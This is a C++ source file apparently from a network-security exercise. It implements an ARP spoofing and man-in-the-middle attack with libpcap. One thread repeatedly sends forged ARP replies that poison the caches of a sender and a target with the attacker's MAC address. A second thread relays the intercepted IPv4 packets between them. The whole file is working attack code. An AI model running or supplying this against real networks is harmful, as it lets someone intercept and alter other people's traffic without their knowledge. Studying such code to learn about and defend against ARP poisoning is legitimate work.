#include "attack.h"

void *sendArpReply(void *args) {
    SendArpReplyArgs *send_arp_reply_args = (SendArpReplyArgs *)args;
    volatile bool *running = send_arp_reply_args->running;
    char *dev = send_arp_reply_args->dev;
    Mac *attacker_mac = send_arp_reply_args->attacker_mac;
    Ip *attacker_ip = send_arp_reply_args->attacker_ip;
    Mac *sender_mac = send_arp_reply_args->sender_mac;
    Ip *sender_ip = send_arp_reply_args->sender_ip;
    Mac *target_mac = send_arp_reply_args->target_mac;
    Ip *target_ip = send_arp_reply_args->target_ip;

    EthArpPacket sender_packet, target_packet;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return NULL;
    }

    sender_packet.eth_.dmac_ = *sender_mac;
    sender_packet.eth_.smac_ = *attacker_mac;
    sender_packet.eth_.type_ = htons(EthHdr::Arp);

    sender_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    sender_packet.arp_.pro_ = htons(EthHdr::Ip4);
    sender_packet.arp_.hln_ = Mac::SIZE;
    sender_packet.arp_.pln_ = Ip::SIZE;
    sender_packet.arp_.op_ = htons(ArpHdr::Reply);
    sender_packet.arp_.smac_ = *attacker_mac;
    // sender_packet.arp_.smac_ = Mac("E0:0A:F6:67:FF:25");
    sender_packet.arp_.sip_ = htonl(*target_ip);
    sender_packet.arp_.tmac_ = *sender_mac;
    sender_packet.arp_.tip_ = htonl(*sender_ip);



    target_packet.eth_.dmac_ = *target_mac;
    target_packet.eth_.smac_ = *attacker_mac;
    target_packet.eth_.type_ = htons(EthHdr::Arp);

    target_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    target_packet.arp_.pro_ = htons(EthHdr::Ip4);
    target_packet.arp_.hln_ = Mac::SIZE;
    target_packet.arp_.pln_ = Ip::SIZE;
    target_packet.arp_.op_ = htons(ArpHdr::Reply);
    target_packet.arp_.smac_ = *attacker_mac;
    // target_packet.arp_.smac_ = Mac("E0:0A:F6:67:FF:25");
    target_packet.arp_.sip_ = htonl(*sender_ip);
    target_packet.arp_.tmac_ = *target_mac;
    target_packet.arp_.tip_ = htonl(*target_ip);


    while (*running) {
        int res;
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sender_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            pcap_close(handle);
            return NULL;
        }
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&target_packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            pcap_close(handle);
            return NULL;
        }
        sleep(1);
    }

    pcap_close(handle);
    return NULL;
}

void *relayPacket(void *args) {
    RelayPacketArgs *relay_packet_args = (RelayPacketArgs *)args;
    volatile bool *running = relay_packet_args->running;
    char *dev = relay_packet_args->dev;
    Mac *attacker_mac = relay_packet_args->attacker_mac;
    Mac *sender_mac = relay_packet_args->sender_mac;
    Ip *sender_ip = relay_packet_args->sender_ip;
    Mac *target_mac = relay_packet_args->target_mac;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return NULL;
    }

    while (*running) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res;
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return NULL;
        }

        EthHdr* eth = (EthHdr*)packet;
        if (eth->type() != EthHdr::Ip4) continue;
        IpHdr* ipv4 = (IpHdr*)(packet + sizeof(EthHdr));
        if (eth->smac_ == *sender_mac) eth->dmac_ = *target_mac;
        else if (ipv4->dip() == *sender_ip) eth->dmac_ = *sender_mac;
        else continue;

        eth->smac_ = *attacker_mac;
        res = pcap_sendpacket(handle, packet, header->caplen);
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return NULL;
        }
    }

    pcap_close(handle);
    return NULL;
}